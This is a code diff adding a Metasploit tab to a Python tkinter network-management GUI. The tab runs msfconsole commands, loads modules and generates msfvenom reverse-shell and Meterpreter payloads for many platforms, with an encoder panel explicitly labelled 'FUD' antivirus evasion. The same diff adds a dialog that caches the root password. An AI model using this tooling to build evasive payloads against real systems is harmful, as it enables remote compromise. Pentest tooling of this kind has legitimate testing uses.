@@ -7,11 +7,12 @@ Desktop application to discover and configure devices on your network.
 import sys
 import os
 import tkinter as tk
-from tkinter import ttk, messagebox, scrolledtext, simpledialog
+from tkinter import ttk, messagebox, scrolledtext, simpledialog, filedialog
 import threading
 import subprocess
 import getpass
 import time
+import re
 from typing import Optional, List, Dict
 from network_scanner import NetworkScanner, NetworkDevice
 from device_storage import DeviceStorage
@@ -54,6 +55,7 @@ class NetworkManagerGUI:
         # Initialize components
         self.scanner = NetworkScanner()
         self.scanner.set_progress_callback(self.on_scan_progress)
+        self.scanner.set_password_callback(self.request_sudo_password)  # Set password callback
         self.storage = DeviceStorage()
         
         # Device list
@@ -269,6 +271,14 @@ class NetworkManagerGUI:
         reporting_tab = ttk.Frame(notebook, padding="5")
         notebook.add(reporting_tab, text="Reporting")
         
+        # Tab 11: Metasploit Framework
+        metasploit_tab = ttk.Frame(notebook, padding="5")
+        notebook.add(metasploit_tab, text="Metasploit")
+        
+        # Tab 12: Metasploit Help
+        metasploit_help_tab = ttk.Frame(notebook, padding="5")
+        notebook.add(metasploit_help_tab, text="Metasploit Help")
+        
         # Top frame with scan controls (in scan tab)
         scan_frame = ttk.LabelFrame(scan_tab, text="Network Scan", padding="10")
         scan_frame.pack(fill=tk.X, pady=(0, 10))
@@ -315,9 +325,8 @@ class NetworkManagerGUI:
         self.ports_entry = ports_entry
         
         # Ports hint (more compact)
-        nmap_status = " (nmap will be used for large ranges)" if self.scanner.has_nmap else ""
         ports_hint = ttk.Label(scan_frame, 
-                              text=f"(e.g., 80,443,8080-8090 or empty for common){nmap_status}", 
+                              text="(e.g., 80,443,8080-8090 or empty for common)", 
                               font=("Segoe UI", 8), foreground="#666666")
         ports_hint.grid(row=1, column=2, columnspan=5, sticky=tk.W, padx=(10, 0), pady=2)
         
@@ -467,6 +476,8 @@ class NetworkManagerGUI:
         self.create_config_management_tab(config_tab)
         self.create_bandwidth_tab(bandwidth_tab)
         self.create_security_tab(security_tab)
+        self.create_metasploit_tab(metasploit_tab)
+        self.create_metasploit_help_tab(metasploit_help_tab)
         self.create_troubleshooting_tab(troubleshooting_tab)
         self.create_reporting_tab(reporting_tab)
         
@@ -572,6 +583,95 @@ class NetworkManagerGUI:
         self.scan_btn.config(state="normal")
         self.stop_btn.config(state="disabled")
         self.progress_label.config(text="Scan stopped by user", foreground="#CC0000")
+    
+    def request_sudo_password(self) -> Optional[str]:
+        """Request sudo password from user via dialog."""
+        # Create a custom password dialog
+        dialog = tk.Toplevel(self.root)
+        dialog.title("Root Password Required")
+        dialog.geometry("400x150")
+        dialog.resizable(False, False)
+        dialog.transient(self.root)
+        dialog.grab_set()  # Make dialog modal
+        
+        # Center the dialog on the same monitor as the main window
+        dialog.update_idletasks()
+        
+        # Get main window position
+        main_x = self.root.winfo_x()
+        main_y = self.root.winfo_y()
+        main_width = self.root.winfo_width()
+        main_height = self.root.winfo_height()
+        
+        # Calculate center of main window
+        center_x = main_x + (main_width // 2)
+        center_y = main_y + (main_height // 2)
+        
+        # Position dialog centered on main window
+        dialog_width = dialog.winfo_width()
+        dialog_height = dialog.winfo_height()
+        x = center_x - (dialog_width // 2)
+        y = center_y - (dialog_height // 2)
+        
+        # Ensure dialog stays on screen (in case main window is partially off-screen)
+        screen_width = self.root.winfo_screenwidth()
+        screen_height = self.root.winfo_screenheight()
+        
+        # Get the monitor where the main window is located
+        # For multi-monitor setups, we need to ensure dialog appears on same monitor
+        if x < 0:
+            x = main_x + 50  # Offset from main window if too far left
+        if y < 0:
+            y = main_y + 50  # Offset from main window if too far up
+        if x + dialog_width > screen_width:
+            x = screen_width - dialog_width - 10
+        if y + dialog_height > screen_height:
+            y = screen_height - dialog_height - 10
+        
+        dialog.geometry(f"+{x}+{y}")
+        
+        password_var = tk.StringVar()
+        result = {'password': None}
+        
+        # Message
+        msg_frame = ttk.Frame(dialog, padding="10")
+        msg_frame.pack(fill=tk.BOTH, expand=True)
+        
+        ttk.Label(msg_frame, text="Nmap SYN scan requires root privileges.\nPlease enter your password:", 
+                 justify=tk.LEFT).pack(pady=(0, 10))
+        
+        # Password entry
+        entry_frame = ttk.Frame(msg_frame)
+        entry_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        ttk.Label(entry_frame, text="Password:").pack(side=tk.LEFT, padx=(0, 5))
+        password_entry = ttk.Entry(entry_frame, textvariable=password_var, show="*", width=30)
+        password_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
+        password_entry.focus()
+        
+        # Buttons
+        button_frame = ttk.Frame(msg_frame)
+        button_frame.pack(fill=tk.X)
+        
+        def on_ok():
+            result['password'] = password_var.get()
+            dialog.destroy()
+        
+        def on_cancel():
+            result['password'] = None
+            dialog.destroy()
+        
+        ttk.Button(button_frame, text="OK", command=on_ok, width=10).pack(side=tk.RIGHT, padx=(5, 0))
+        ttk.Button(button_frame, text="Cancel", command=on_cancel, width=10).pack(side=tk.RIGHT)
+        
+        # Handle Enter key
+        password_entry.bind('<Return>', lambda e: on_ok())
+        dialog.bind('<Escape>', lambda e: on_cancel())
+        
+        # Wait for dialog to close
+        dialog.wait_window()
+        
+        return result['password']
     
     def on_scan_progress(self, message: str):
         """Handle scan progress updates."""
@@ -3301,6 +3401,1094 @@ class NetworkManagerGUI:
             self.hide_to_tray()
         else:
             self.root.destroy()
+    
+    def create_metasploit_tab(self, parent):
+        """Create the Metasploit Framework tab."""
+        import shutil
+        
+        # Check if Metasploit is installed
+        has_metasploit = shutil.which('msfconsole') is not None
+        metasploit_path = shutil.which('msfconsole') or 'Not found'
+        
+        # Status frame
+        status_frame = ttk.LabelFrame(parent, text="Metasploit Status", padding="10")
+        status_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        status_text = f"Metasploit Framework: {'Installed' if has_metasploit else 'Not Found'}"
+        if has_metasploit:
+            status_text += f" ({metasploit_path})"
+        status_label = ttk.Label(status_frame, text=status_text, 
+                               foreground="#00AA00" if has_metasploit else "#CC0000",
+                               font=("Segoe UI", 9, "bold"))
+        status_label.pack(side=tk.LEFT)
+        
+        if not has_metasploit:
+            install_hint = ttk.Label(status_frame, 
+                                    text="Install Metasploit Framework to use this tab",
+                                    foreground="#666666", font=("Segoe UI", 8))
+            install_hint.pack(side=tk.LEFT, padx=(10, 0))
+        
+        # Main container with two columns
+        main_container = ttk.Frame(parent)
+        main_container.pack(fill=tk.BOTH, expand=True)
+        
+        # Left column - Console and Commands
+        left_frame = ttk.Frame(main_container)
+        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
+        
+        # Console output - reduced height to fit better
+        console_frame = ttk.LabelFrame(left_frame, text="Metasploit Console", padding="3")
+        console_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 5))
+        
+        self.metasploit_console = scrolledtext.ScrolledText(console_frame, 
+                                                           height=10, 
+                                                           font=("Consolas", 8),
+                                                           bg="#1e1e1e",
+                                                           fg="#d4d4d4",
+                                                           insertbackground="#d4d4d4")
+        self.metasploit_console.pack(fill=tk.BOTH, expand=True)
+        self.metasploit_console.insert(tk.END, "Metasploit Framework Console\n")
+        self.metasploit_console.insert(tk.END, "=" * 50 + "\n")
+        if has_metasploit:
+            self.metasploit_console.insert(tk.END, "Metasploit is ready. Use the command input below.\n")
+        else:
+            self.metasploit_console.insert(tk.END, "Metasploit Framework not found. Please install it first.\n")
+        self.metasploit_console.insert(tk.END, "=" * 50 + "\n\n")
+        
+        # Command input - more compact
+        cmd_frame = ttk.Frame(left_frame)
+        cmd_frame.pack(fill=tk.X)
+        
+        ttk.Label(cmd_frame, text="Cmd:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
+        self.metasploit_cmd_var = tk.StringVar()
+        cmd_entry = ttk.Entry(cmd_frame, textvariable=self.metasploit_cmd_var, 
+                             font=("Consolas", 8))
+        cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 3))
+        cmd_entry.bind('<Return>', lambda e: self.execute_metasploit_command())
+        
+        execute_btn = ttk.Button(cmd_frame, text="Execute", 
+                                command=self.execute_metasploit_command,
+                                state="normal" if has_metasploit else "disabled")
+        execute_btn.pack(side=tk.LEFT)
+        
+        # Right column - Tools and Modules
+        right_frame = ttk.Frame(main_container)
+        right_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(5, 0))
+        
+        # Quick Actions - removed Start/Stop buttons since commands work without them
+        # Search modules - compact layout
+        search_frame = ttk.Frame(right_frame)
+        search_frame.pack(fill=tk.X, pady=(0, 5))
+        
+        ttk.Label(search_frame, text="Search Module:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
+        self.metasploit_search_var = tk.StringVar()
+        search_entry = ttk.Entry(search_frame, textvariable=self.metasploit_search_var,
+                               font=("Consolas", 8))
+        search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 3))
+        search_entry.bind('<Return>', lambda e: self.search_metasploit_modules())
+        
+        search_btn = ttk.Button(search_frame, text="Search",
+                              command=self.search_metasploit_modules,
+                              state="normal" if has_metasploit else "disabled")
+        search_btn.pack(side=tk.LEFT)
+        
+        # Modules List
+        modules_frame = ttk.LabelFrame(right_frame, text="Metasploit Modules", padding="10")
+        modules_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
+        
+        # Module filter/search
+        filter_frame = ttk.Frame(modules_frame)
+        filter_frame.pack(fill=tk.X, pady=(0, 5))
+        
+        ttk.Label(filter_frame, text="Filter:", font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=(0, 5))
+        self.metasploit_module_filter = tk.StringVar()
+        filter_entry = ttk.Entry(filter_frame, textvariable=self.metasploit_module_filter,
+                                font=("Consolas", 9))
+        filter_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
+        filter_entry.bind('<KeyRelease>', self.filter_metasploit_modules)
+        
+        # Module type filter
+        self.metasploit_module_type = tk.StringVar(value="All")
+        type_combo = ttk.Combobox(filter_frame, textvariable=self.metasploit_module_type,
+                                 values=["All", "exploit", "auxiliary", "payload", "post", "encoder", "nop"],
+                                 width=12, font=("Consolas", 9), state="readonly")
+        type_combo.pack(side=tk.LEFT)
+        type_combo.bind('<<ComboboxSelected>>', lambda e: self.filter_metasploit_modules(None))
+        
+        # Module list with scrollbar
+        modules_list_frame = ttk.Frame(modules_frame)
+        modules_list_frame.pack(fill=tk.BOTH, expand=True)
+        
+        # Scrollbar for module list
+        modules_scrollbar = ttk.Scrollbar(modules_list_frame)
+        modules_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+        
+        # Listbox for modules
+        self.metasploit_modules_list = tk.Listbox(modules_list_frame,
+                                                 yscrollcommand=modules_scrollbar.set,
+                                                 font=("Consolas", 9),
+                                                 height=8)
+        self.metasploit_modules_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        modules_scrollbar.config(command=self.metasploit_modules_list.yview)
+        
+        # Double-click to use module, single click to select
+        self.metasploit_modules_list.bind('<Double-Button-1>', self.use_metasploit_module)
+        self.metasploit_modules_list.bind('<Button-1>', self.select_metasploit_module)
+        
+        # Module selection buttons
+        module_btn_frame = ttk.Frame(modules_frame)
+        module_btn_frame.pack(fill=tk.X, pady=(5, 0))
+        
+        use_module_btn = ttk.Button(module_btn_frame, text="Use Selected Module",
+                                    command=self.use_selected_metasploit_module,
+                                    state="disabled")
+        use_module_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
+        self.use_module_btn = use_module_btn
+        
+        self.load_modules_btn = ttk.Button(module_btn_frame, text="Load Modules",
+                                           command=self.load_metasploit_modules,
+                                           state="normal" if has_metasploit else "disabled")
+        self.load_modules_btn.pack(side=tk.LEFT, fill=tk.X, expand=True)
+        
+        # Store all modules for filtering
+        self.metasploit_all_modules = []
+        
+        # Payload Generator - more compact
+        payload_frame = ttk.LabelFrame(right_frame, text="Payload Generator", padding="5")
+        payload_frame.pack(fill=tk.X, pady=(0, 5))
+        
+        # Payload type - compact
+        payload_type_frame = ttk.Frame(payload_frame)
+        payload_type_frame.pack(fill=tk.X, pady=(0, 3))
+        
+        ttk.Label(payload_type_frame, text="Type:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
+        self.metasploit_payload_type = tk.StringVar(value="windows/meterpreter/reverse_tcp")
+        
+        # Comprehensive list of msfvenom payloads
+        payload_list = [
+            # Windows Meterpreter
+            "windows/meterpreter/reverse_tcp",
+            "windows/meterpreter/reverse_http",
+            "windows/meterpreter/reverse_https",
+            "windows/meterpreter/bind_tcp",
+            "windows/x64/meterpreter/reverse_tcp",
+            "windows/x64/meterpreter/reverse_http",
+            "windows/x64/meterpreter/reverse_https",
+            "windows/x64/meterpreter/bind_tcp",
+            # Windows Shell
+            "windows/shell/reverse_tcp",
+            "windows/shell/bind_tcp",
+            "windows/x64/shell/reverse_tcp",
+            "windows/x64/shell/bind_tcp",
+            # Linux Meterpreter
+            "linux/x86/meterpreter/reverse_tcp",
+            "linux/x86/meterpreter/reverse_http",
+            "linux/x86/meterpreter/reverse_https",
+            "linux/x86/meterpreter/bind_tcp",
+            "linux/x64/meterpreter/reverse_tcp",
+            "linux/x64/meterpreter/reverse_http",
+            "linux/x64/meterpreter/reverse_https",
+            "linux/x64/meterpreter/bind_tcp",
+            # Linux Shell
+            "linux/x86/shell/reverse_tcp",
+            "linux/x86/shell/bind_tcp",
+            "linux/x64/shell/reverse_tcp",
+            "linux/x64/shell/bind_tcp",
+            # Android
+            "android/meterpreter/reverse_tcp",
+            "android/meterpreter/reverse_http",
+            "android/meterpreter/reverse_https",
+            # macOS
+            "osx/x86/shell_reverse_tcp",
+            "osx/x86/shell_bind_tcp",
+            "osx/x64/shell_reverse_tcp",
+            "osx/x64/meterpreter/reverse_tcp",
+            # PHP
+            "php/meterpreter/reverse_tcp",
+            "php/meterpreter_reverse_tcp",
+            "php/shell_reverse_tcp",
+            # Python
+            "python/meterpreter/reverse_tcp",
+            "python/meterpreter/reverse_http",
+            "python/shell_reverse_tcp",
+            # Java
+            "java/meterpreter/reverse_tcp",
+            "java/meterpreter/reverse_http",
+            "java/shell/reverse_tcp",
+            # PowerShell
+            "windows/powershell/meterpreter/reverse_tcp",
+            "windows/powershell/meterpreter/reverse_http",
+            "windows/powershell/meterpreter/reverse_https",
+            "windows/powershell/shell_reverse_tcp",
+            # CMD
+            "windows/powershell/powershell_reverse_tcp",
+            "cmd/windows/powershell_reverse_tcp",
+            # Node.js
+            "nodejs/shell_reverse_tcp",
+            "nodejs/shell_bind_tcp",
+            # Ruby
+            "ruby/shell_reverse_tcp",
+            "ruby/shell_bind_tcp",
+            # Bash
+            "cmd/unix/reverse_bash",
+            "cmd/unix/reverse_bash_tcp",
+            # Telnet
+            "cmd/unix/reverse",
+            "cmd/unix/bind",
+        ]
+        
+        payload_type_combo = ttk.Combobox(payload_type_frame, textvariable=self.metasploit_payload_type,
+                                         values=payload_list,
+                                         width=30, font=("Consolas", 8))
+        payload_type_combo.pack(side=tk.LEFT, fill=tk.X, expand=True)
+        
+        # LHOST and LPORT in one row
+        hostport_frame = ttk.Frame(payload_frame)
+        hostport_frame.pack(fill=tk.X, pady=(0, 3))
+        
+        ttk.Label(hostport_frame, text="LHOST:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
+        self.metasploit_lhost_var = tk.StringVar()
+        lhost_entry = ttk.Entry(hostport_frame, textvariable=self.metasploit_lhost_var,
+                               font=("Consolas", 8), width=15)
+        lhost_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
+        # Auto-detect local IP
+        try:
+            import socket
+            local_ip = socket.gethostbyname(socket.gethostname())
+            if local_ip and local_ip != '127.0.0.1':
+                self.metasploit_lhost_var.set(local_ip)
+        except:
+            pass
+        
+        ttk.Label(hostport_frame, text="LPORT:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
+        self.metasploit_lport_var = tk.StringVar(value="4444")
+        lport_entry = ttk.Entry(hostport_frame, textvariable=self.metasploit_lport_var,
+                               font=("Consolas", 8), width=8)
+        lport_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
+        
+        # Format and Output directory in one row
+        format_dir_frame = ttk.Frame(payload_frame)
+        format_dir_frame.pack(fill=tk.X, pady=(0, 3))
+        
+        ttk.Label(format_dir_frame, text="Format:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
+        self.metasploit_format_var = tk.StringVar(value="exe")
+        format_combo = ttk.Combobox(format_dir_frame, textvariable=self.metasploit_format_var,
+                                   values=["exe", "raw", "elf", "python", "ps1", "sh", "bash", "perl", 
+                                          "ruby", "lua", "java", "war", "jsp", "asp", "aspx", "dll",
+                                          "so", "deb", "rpm", "apk", "jar", "a", "macho", "msi",
+                                          "vbs", "js", "hta", "cpl", "dylib", "bin", "hex", "base64"],
+                                   width=8, font=("Consolas", 8))
+        format_combo.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
+        
+        ttk.Label(format_dir_frame, text="Dir:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
+        self.metasploit_output_dir = tk.StringVar(value=os.path.expanduser("~"))
+        output_dir_entry = ttk.Entry(format_dir_frame, textvariable=self.metasploit_output_dir,
+                                     font=("Consolas", 8), width=12)
+        output_dir_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 3))
+        
+        browse_dir_btn = ttk.Button(format_dir_frame, text="...",
+                                    command=self.browse_payload_directory)
+        browse_dir_btn.pack(side=tk.LEFT)
+        
+        # Output file
+        output_frame = ttk.Frame(payload_frame)
+        output_frame.pack(fill=tk.X, pady=(0, 3))
+        
+        ttk.Label(output_frame, text="Filename:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
+        self.metasploit_output_var = tk.StringVar(value="payload")
+        output_entry = ttk.Entry(output_frame, textvariable=self.metasploit_output_var,
+                                font=("Consolas", 8))
+        output_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
+        
+        # FUD Encoding options
+        fud_frame = ttk.LabelFrame(payload_frame, text="FUD Encoding (Anti-Virus Evasion)", padding="3")
+        fud_frame.pack(fill=tk.X, pady=(3, 0))
+        
+        encoder_frame = ttk.Frame(fud_frame)
+        encoder_frame.pack(fill=tk.X, pady=(0, 3))
+        
+        ttk.Label(encoder_frame, text="Encoder:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
+        self.metasploit_encoder_var = tk.StringVar(value="None")
+        encoder_combo = ttk.Combobox(encoder_frame, textvariable=self.metasploit_encoder_var,
+                                    values=["None", "x86/shikata_ga_nai", "x86/call4_dword_xor", 
+                                           "x86/countdown", "x86/fnstenv_mov", "x86/jmp_call_additive",
+                                           "x86/nonalpha", "x86/opt_sub", "x86/unicode_mixed",
+                                           "x86/unicode_upper", "x64/xor", "x64/xor_dynamic",
+                                           "x64/zutto_dekiru", "cmd/powershell_base64"],
+                                    width=20, font=("Consolas", 8), state="readonly")
+        encoder_combo.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
+        
+        ttk.Label(encoder_frame, text="Iterations:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
+        self.metasploit_iterations_var = tk.StringVar(value="1")
+        iterations_entry = ttk.Entry(encoder_frame, textvariable=self.metasploit_iterations_var,
+                                     font=("Consolas", 8), width=5)
+        iterations_entry.pack(side=tk.LEFT)
+        
+        # Generate and Handler buttons in one row
+        btn_frame = ttk.Frame(payload_frame)
+        btn_frame.pack(fill=tk.X, pady=(3, 0))
+        
+        generate_btn = ttk.Button(btn_frame, text="Generate",
+                                 command=self.generate_metasploit_payload,
+                                 state="normal" if has_metasploit else "disabled")
+        generate_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 3))
+        
+        handler_btn = ttk.Button(btn_frame, text="Setup Handler",
+                                command=self.setup_metasploit_handler,
+                                state="normal" if has_metasploit else "disabled")
+        handler_btn.pack(side=tk.LEFT, fill=tk.X, expand=True)
+        
+        # Quick Commands - more compact
+        quick_cmds_frame = ttk.LabelFrame(right_frame, text="Quick Commands", padding="5")
+        quick_cmds_frame.pack(fill=tk.X)
+        
+        quick_btn_frame = ttk.Frame(quick_cmds_frame)
+        quick_btn_frame.pack(fill=tk.X)
+        
+        # Common commands
+        common_commands = [
+            ("Sessions", "sessions", None),
+            ("Jobs", "jobs", None),
+            ("Info", "info", self.show_info_dialog),
+            ("Show Options", "show options", None),
+            ("Show Payloads", "show payloads", None),
+            ("Back", "back", None),
+            ("Exit", "exit", None),
+        ]
+        
+        for i, (label, cmd, handler) in enumerate(common_commands):
+            if handler:
+                btn = ttk.Button(quick_btn_frame, text=label, width=10,
+                               command=handler,
+                               state="normal" if has_metasploit else "disabled")
+            else:
+                btn = ttk.Button(quick_btn_frame, text=label, width=10,
+                               command=lambda c=cmd: self.execute_quick_command(c),
+                               state="normal" if has_metasploit else "disabled")
+            btn.grid(row=i // 4, column=i % 4, padx=1, pady=1, sticky=(tk.W, tk.E))
+        
+        quick_btn_frame.columnconfigure(0, weight=1)
+        quick_btn_frame.columnconfigure(1, weight=1)
+        quick_btn_frame.columnconfigure(2, weight=1)
+        quick_btn_frame.columnconfigure(3, weight=1)
+        
+        # Metasploit process tracking
+        self.metasploit_process = None
+        self.metasploit_sudo_password = None
+        self.metasploit_modules_loaded = False
+        self.metasploit_selected_module = None
+    
+    # Note: Commands execute directly via msfconsole -q -x without needing a persistent process
+    # This is more efficient and doesn't require Start/Stop buttons
+    
+    def execute_metasploit_command(self):
+        """Execute a Metasploit command."""
+        cmd = self.metasploit_cmd_var.get().strip()
+        if not cmd:
+            return
+        
+        self.append_metasploit_output(f"> {cmd}\n")
+        self.metasploit_cmd_var.set("")
+        
+        # Check if command needs root
+        needs_root = any(keyword in cmd.lower() for keyword in [
+            'exploit', 'use exploit', 'run', 'execute'
+        ])
+        
+        if needs_root and not self.metasploit_sudo_password:
+            password = self.request_sudo_password()
+            if password:
+                self.metasploit_sudo_password = password
+            else:
+                self.append_metasploit_output("Command cancelled (root password required).\n")
+                return
+        
+        # Execute command directly via msfconsole (no persistent process needed)
+        try:
+            if 'search' in cmd.lower():
+                # Handle search command
+                search_term = cmd.replace('search', '').strip()
+                result = subprocess.run(['msfconsole', '-q', '-x', f'search {search_term}; exit'],
+                                      capture_output=True, text=True, timeout=30)
+                self.append_metasploit_output(result.stdout)
+                if result.stderr:
+                    self.append_metasploit_output(f"Error: {result.stderr}\n")
+            else:
+                # Generic command execution
+                result = subprocess.run(['msfconsole', '-q', '-x', f'{cmd}; exit'],
+                                      capture_output=True, text=True, timeout=30)
+                self.append_metasploit_output(result.stdout)
+                if result.stderr:
+                    self.append_metasploit_output(f"Error: {result.stderr}\n")
+        except subprocess.TimeoutExpired:
+            self.append_metasploit_output("Command timed out.\n")
+        except Exception as e:
+            self.append_metasploit_output(f"Error executing command: {str(e)}\n")
+    
+    def search_metasploit_modules(self):
+        """Search for Metasploit modules."""
+        search_term = self.metasploit_search_var.get().strip()
+        if not search_term:
+            messagebox.showwarning("Search", "Please enter a search term.")
+            return
+        
+        self.append_metasploit_output(f"Searching for: {search_term}\n")
+        try:
+            result = subprocess.run(['msfconsole', '-q', '-x', f'search {search_term}; exit'],
+                                  capture_output=True, text=True, timeout=30)
+            self.append_metasploit_output(result.stdout)
+            if result.stderr:
+                self.append_metasploit_output(f"Error: {result.stderr}\n")
+        except subprocess.TimeoutExpired:
+            self.append_metasploit_output("Search timed out.\n")
+        except Exception as e:
+            self.append_metasploit_output(f"Error: {str(e)}\n")
+    
+    def generate_metasploit_payload(self):
+        """Generate a Metasploit payload using msfvenom."""
+        payload_type = self.metasploit_payload_type.get()
+        lhost = self.metasploit_lhost_var.get().strip()
+        lport = self.metasploit_lport_var.get().strip()
+        output_format = self.metasploit_format_var.get()
+        output_file = self.metasploit_output_var.get().strip()
+        
+        if not lhost:
+            messagebox.showwarning("Payload", "Please enter LHOST (your IP address).")
+            return
+        
+        if not lport:
+            messagebox.showwarning("Payload", "Please enter LPORT.")
+            return
+        
+        if not output_file:
+            messagebox.showwarning("Payload", "Please enter output filename.")
+            return
+        
+        # Get output directory
+        output_dir = self.metasploit_output_dir.get().strip()
+        if not output_dir:
+            output_dir = os.path.expanduser("~")
+        
+        # Ensure directory exists
+        try:
+            os.makedirs(output_dir, exist_ok=True)
+        except Exception as e:
+            messagebox.showerror("Error", f"Cannot create output directory: {str(e)}")
+            return
+        
+        # Build full output path
+        output_path = os.path.join(output_dir, f"{output_file}.{output_format}")
+        
+        # Get FUD encoding options
+        encoder = self.metasploit_encoder_var.get()
+        iterations = self.metasploit_iterations_var.get().strip()
+        
+        # Build msfvenom command
+        cmd = ['msfvenom', '-p', payload_type, f'LHOST={lhost}', f'LPORT={lport}', f'-f', output_format]
+        
+        # Add encoder if selected
+        if encoder and encoder != "None":
+            try:
+                iterations_int = int(iterations) if iterations else 1
+                if iterations_int < 1:
+                    iterations_int = 1
+                elif iterations_int > 10:
+                    iterations_int = 10  # Limit to prevent excessive encoding
+                cmd.extend(['-e', encoder, '-i', str(iterations_int)])
+            except ValueError:
+                cmd.extend(['-e', encoder, '-i', '1'])
+        
+        cmd.extend(['-o', output_path])
+        
+        self.append_metasploit_output(f"Generating payload: {payload_type}\n")
+        if encoder and encoder != "None":
+            self.append_metasploit_output(f"Encoder: {encoder} (iterations: {iterations})\n")
+        self.append_metasploit_output(f"Command: {' '.join(cmd)}\n")
+        
+        try:
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+            if result.returncode == 0:
+                self.append_metasploit_output(f"Payload generated successfully: {output_path}\n")
+                self.append_metasploit_output(result.stdout)
+            else:
+                self.append_metasploit_output(f"Error generating payload:\n{result.stderr}\n")
+                messagebox.showerror("Error", f"Failed to generate payload:\n{result.stderr}")
+        except subprocess.TimeoutExpired:
+            self.append_metasploit_output("Payload generation timed out.\n")
+            messagebox.showerror("Timeout", "Payload generation timed out.")
+        except Exception as e:
+            self.append_metasploit_output(f"Error: {str(e)}\n")
+            messagebox.showerror("Error", f"Failed to generate payload: {str(e)}")
+    
+    def load_metasploit_modules(self):
+        """Load all Metasploit modules into the list."""
+        self.append_metasploit_output("Loading Metasploit modules... This may take a moment.\n")
+        self.metasploit_modules_list.delete(0, tk.END)
+        self.metasploit_all_modules = []
+        
+        # Disable load button while loading
+        if hasattr(self, 'load_modules_btn'):
+            self.load_modules_btn.config(state="disabled")
+        
+        def load_in_thread():
+            """Load modules in background thread."""
+            modules = []
+            
+            try:
+                # Use search command which outputs cleaner module lists
+                self.root.after(0, lambda: self.append_metasploit_output("Searching for modules...\n"))
+                
+                # Search for all module types
+                search_commands = [
+                    'search type:exploit',
+                    'search type:auxiliary', 
+                    'search type:payload',
+                    'search type:post',
+                    'search type:encoder',
+                    'search type:nop'
+                ]
+                
+                for search_cmd in search_commands:
+                    try:
+                        result = subprocess.run(['msfconsole', '-q', '-x', f'{search_cmd}; exit'],
+                                              capture_output=True, text=True, timeout=45)
+                        
+                        # Parse search results - format is cleaner
+                        for line in result.stdout.split('\n'):
+                            line = line.strip()
+                            if not line or line.startswith('=') or 'Matching' in line or '====' in line:
+                                continue
+                            
+                            # Search output format: "exploit/path/to/module    description..."
+                            # Or: "   exploit/path/to/module"
+                            parts = line.split()
+                            for part in parts:
+                                # Look for module paths
+                                if '/' in part and (
+                                    part.startswith('exploit/') or
+                                    part.startswith('auxiliary/') or
+                                    part.startswith('payload/') or
+                                    part.startswith('post/') or
+                                    part.startswith('encoder/') or
+                                    part.startswith('nop/')
+                                ):
+                                    # Clean up any trailing punctuation
+                                    module = part.rstrip('.,;:')
+                                    if module not in modules:
+                                        modules.append(module)
+                                    break
+                    except subprocess.TimeoutExpired:
+                        self.root.after(0, lambda: self.append_metasploit_output(f"Timeout on {search_cmd}\n"))
+                    except Exception as e:
+                        self.root.after(0, lambda e=str(e), s=search_cmd: self.append_metasploit_output(f"Error on {s}: {e}\n"))
+                
+                # If we didn't get many modules, try alternative method using show commands
+                if len(modules) < 50:
+                    self.root.after(0, lambda: self.append_metasploit_output("Trying alternative method (show commands)...\n"))
+                    # Try show commands with better parsing
+                    module_types = ['exploits', 'auxiliary', 'payloads', 'post', 'encoders', 'nops']
+                    for mod_type in module_types:
+                        try:
+                            result = subprocess.run(['msfconsole', '-q', '-x', f'show {mod_type}; exit'],
+                                                  capture_output=True, text=True, timeout=20)
+                            # Parse table format - look for lines with module paths
+                            for line in result.stdout.split('\n'):
+                                line = line.strip()
+                                if not line or '===' in line or '---' in line or 'Name' in line and 'Disclosure' in line:
+                                    continue
+                                # Look for module path pattern in the line
+                                # Match patterns like "exploit/..." or "auxiliary/..." etc
+                                matches = re.findall(r'\b(exploit|auxiliary|payload|post|encoder|nop)/[^\s]+', line)
+                                for match in matches:
+                                    if match not in modules:
+                                        modules.append(match)
+                        except:
+                            pass
+                
+                # Fallback to msfvenom payloads if still empty
+                if not modules:
+                    self.root.after(0, lambda: self.append_metasploit_output("Loading payloads from msfvenom...\n"))
+                    try:
+                        result = subprocess.run(['msfvenom', '--list', 'payloads'],
+                                              capture_output=True, text=True, timeout=30)
+                        for line in result.stdout.split('\n'):
+                            line = line.strip()
+                            if line and '/' in line and not line.startswith(' ') and not line.startswith('Name'):
+                                parts = line.split()
+                                if parts:
+                                    module = parts[0]
+                                    if module.startswith('payload/'):
+                                        modules.append(module.replace('payload/', 'payload/'))
+                                    elif '/' in module:
+                                        modules.append(module)
+                    except Exception as e:
+                        self.root.after(0, lambda e=str(e): self.append_metasploit_output(f"Error: {e}\n"))
+                
+                # Store and display modules
+                unique_modules = sorted(set(modules))
